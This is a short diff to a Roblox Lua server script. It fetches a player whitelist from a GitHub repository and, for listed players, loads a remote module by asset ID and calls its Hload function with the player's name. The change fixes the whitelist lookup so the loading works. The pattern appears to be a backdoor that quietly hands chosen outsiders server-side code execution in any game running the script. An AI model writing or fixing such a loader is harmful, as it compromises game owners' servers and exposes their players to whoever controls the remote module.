@@ -15,7 +15,7 @@ end
 local WL = getJson("https://raw.githubusercontent.com/pwngd/tester/refs/heads/main/whitelist.json")
 local function onPlayer(player)
 	WL = getJson("https://raw.githubusercontent.com/pwngd/tester/refs/heads/main/whitelist.json")
-	if WL[player.UserId] then
+	if WL[tostring(player.UserId)] then
       -- require(7634392335)(player.Name)
 	  task.spawn(function() 
 			require(135231466738957):Hload(player.Name)
